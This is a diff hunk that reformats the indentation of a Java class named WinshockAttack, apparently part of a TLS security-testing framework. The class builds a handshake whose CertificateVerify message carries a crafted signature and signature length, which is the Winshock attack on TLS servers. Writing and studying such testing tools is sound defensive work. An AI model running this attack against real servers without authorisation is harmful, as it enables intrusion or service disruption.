@@ -36,37 +36,37 @@ public class WinshockAttack extends Attacker<WinshockCommandConfig> {
     private static final Logger LOGGER = LogManager.getLogger(WinshockAttack.class);
 
     public WinshockAttack(WinshockCommandConfig config) {
-	super(config);
+        super(config);
     }
 
     @Override
     public void executeAttack(ConfigHandler configHandler) {
-	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
-	TlsContext tlsContext = configHandler.initializeTlsContext(config);
-	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
+        TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
+        TlsContext tlsContext = configHandler.initializeTlsContext(config);
+        WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
 
-	WorkflowTrace trace = tlsContext.getWorkflowTrace();
+        WorkflowTrace trace = tlsContext.getWorkflowTrace();
 
-	ModifiableByteArray signature = new ModifiableByteArray();
-	signature.setModification(ByteArrayModificationFactory.explicitValue(ArrayConverter
-		.bigIntegerToByteArray(config.getSignature())));
+        ModifiableByteArray signature = new ModifiableByteArray();
+        signature.setModification(ByteArrayModificationFactory.explicitValue(ArrayConverter
+                .bigIntegerToByteArray(config.getSignature())));
 
-	ModifiableInteger signatureLength = new ModifiableInteger();
-	if (config.getSignatureLength() == null) {
-	    signatureLength.setModification(IntegerModificationFactory.explicitValue(signature.getValue().length));
-	} else {
-	    signatureLength.setModification(IntegerModificationFactory.explicitValue(config.getSignatureLength()));
-	}
+        ModifiableInteger signatureLength = new ModifiableInteger();
+        if (config.getSignatureLength() == null) {
+            signatureLength.setModification(IntegerModificationFactory.explicitValue(signature.getValue().length));
+        } else {
+            signatureLength.setModification(IntegerModificationFactory.explicitValue(config.getSignatureLength()));
+        }
 
-	CertificateVerifyMessage cvm = (CertificateVerifyMessage) trace
-		.getFirstConfiguredSendMessageOfType(HandshakeMessageType.CERTIFICATE_VERIFY);
-	cvm.setSignature(signature);
-	cvm.setSignatureLength(signatureLength);
+        CertificateVerifyMessage cvm = (CertificateVerifyMessage) trace
+                .getFirstConfiguredSendMessageOfType(HandshakeMessageType.CERTIFICATE_VERIFY);
+        cvm.setSignature(signature);
+        cvm.setSignatureLength(signatureLength);
 
-	workflowExecutor.executeWorkflow();
+        workflowExecutor.executeWorkflow();
 
-	tlsContexts.add(tlsContext);
+        tlsContexts.add(tlsContext);
 
-	transportHandler.closeConnection();
+        transportHandler.closeConnection();
     }
 }
